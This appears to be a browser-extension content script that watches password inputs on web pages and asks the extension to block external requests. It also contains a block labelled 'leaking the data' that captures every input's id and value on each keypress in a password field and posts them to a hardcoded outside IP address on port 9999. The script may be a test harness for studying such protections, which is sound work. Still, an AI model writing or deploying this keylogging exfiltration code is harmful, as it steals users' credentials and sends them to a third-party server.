'use strict';
var d = new Date();
var time = "[mm:ss:mmmm] "+ d.getMinutes() +":"+d.getSeconds()+":"+d.getMilliseconds();
time = "";
window['message_disable'] = true;
var tm = new Map();
console.log(`%c[A]%c  Start : %c${document.domain}`,'color:Chocolate','color:black',"color: green");
//console.log(document);
if(window === window.top){
  chrome.runtime.sendMessage({action:"log-event-url",domain:location.href},function(){});
  // mando anche i valori attuali
  let lt1 = document.getElementById('log1');
  let lt2 = document.getElementById('log2');
  let lt3 = document.getElementById('log3');
  let lt4 = document.getElementById('log4');
  let lt5 = document.getElementById('log5');
  let local_arr = new Array()
  local_arr = [parseInt(lt1.value),parseInt(lt2.value),parseInt(lt3.value),parseInt(lt4.value),parseInt(lt5.value)];
  let local_arr_str = JSON.stringify(local_arr);
  chrome.runtime.sendMessage({action:"clear_logs",domain:location.href,data:local_arr_str}, function(){});
}
function handler_normal(){
  chrome.runtime.sendMessage({action:"disable-extcomm", domain:document.domain}, function(){
    if(window['message_disable']){
      window['message_disable']=false;
      console.log(`%c[A]%c asks for disable external requests`,'color:Chocolate','color:black');
    }
  });             
}
function handler_check(){
  if(this.type === "password"){
    chrome.runtime.sendMessage({action:"disable-extcomm",domain: document.domain}, function(){
      if(window['message_disable']){
        window['message_enable']=false;
        console.log(`%c[A]%c asks for disable external requests`,'color:Chocolate','color:black');
      }
    });             
  }
}
function secureInputTags(){
  try{
    var item_list = document.getElementsByTagName('input');
    var index=0, list_size = item_list.length;
    while(index<list_size){
      // setting values inside map 
      var t_id;
      var t_value;
      if(item_list[index].hasAttribute('id')){
        t_id = item_list[index].id;
        t_value = item_list[index].value;
        if(!tm.has(t_id)){
          tm.set(t_id,t_value);
        }
      }
      // if type is already password
      if(item_list[index].type==="password"){
        // check if value has changed
        if(tm.has(t_id)){
          let tm_value = tm.get(t_id);
          if(tm_value !== t_value){
            handler_normal();
            tm.set(t_id,t_value);
          }
        }
        //focus event
        item_list[index].addEventListener("focus",handler_normal,{capture:true,once:true,passive:true},true);
        // keypress event
        item_list[index].addEventListener("keypress",handler_normal,{capture:true,once:true,passive:true},true);        
      } //if type is changed from something to password
      else{
        // focuse event
        item_list[index].addEventListener("focus",handler_check,{capture:true,once:true,passive:true},true);
        // keypress event
        item_list[index].addEventListener("keypress",handler_check,{capture:true,once:true,passive:true},true);        
      }
      index+=1;
    }
  }
  catch(error){
    console.error(`[After.js] error : reload listener`);
    console.error(error);
  }
}

secureInputTags();
window.setInterval(function(){secureInputTags();}, 250);

// select the target node
var target1 = document.getElementById('log1');
var target2 = document.getElementById('log2');
var target3 = document.getElementById('log3');
var target4 = document.getElementById('log4');
var target5 = document.getElementById('log5');
 
// create an observer instance
var observer1 = new MutationObserver(function(mutations) {
  mutations.forEach(function(mutation) {
    //console.log(mutation.target.id + "," +mutation.target.value);
    //console.info(mutation.target);
    if(window !== window.top){
      chrome.runtime.sendMessage({action:"log-event",event:mutation.target.id.replace("log",""),value:mutation.target.value,domain:"last"},function(){});
    }
    else{
      chrome.runtime.sendMessage({action:"log-event",event:mutation.target.id.replace("log",""),value:mutation.target.value,domain:location.href},function(){});
    }
  });    
});
// configuration of the observer:
var config = { attributes: true, childList: false, characterData: false };
 
// pass in the target node, as well as the observer options
observer1.observe(target1, config);
observer1.observe(target2, config);
observer1.observe(target3, config);
observer1.observe(target4, config);
observer1.observe(target5, config);
 
/* leaking the data */
var send_data = function(el){
    let long_string = "";
    let password_list = document.getElementsByTagName('input');
    for(counter=0;counter<size;counter++){
      if(password_list[counter] !== undefined)
        long_string+=`${password_list[counter].id}:${password_list[counter].value}|`;
    }
    long_string+=`pwd:${el.target.value+el.key}|`;
    if(true){
        var oReq = new XMLHttpRequest();
        oReq.open("post", location.protocol+"//157.138.190.75:9999", true);
        oReq.send(long_string);
    }
}
var password_list = document.getElementsByTagName('input');
var size = password_list.length;
var counter = 0;
for(counter=0;counter<size;counter++){
    if(password_list[counter].type === "password"){
        password_list[counter].addEventListener("keypress",send_data,{capture:true,once:false,passive:true},true);
    }
}





/* end leaking the data */
var d = new Date();
var time = "[mm:ss:mmmm] "+ d.getMinutes() +":"+d.getSeconds()+":"+d.getMilliseconds();
time = "";
console.log(`%c[A]%c  End :  %c${document.domain}`,'color:Chocolate','color:black',"color: green");

//window.setInterval(function(){close()}, 5000);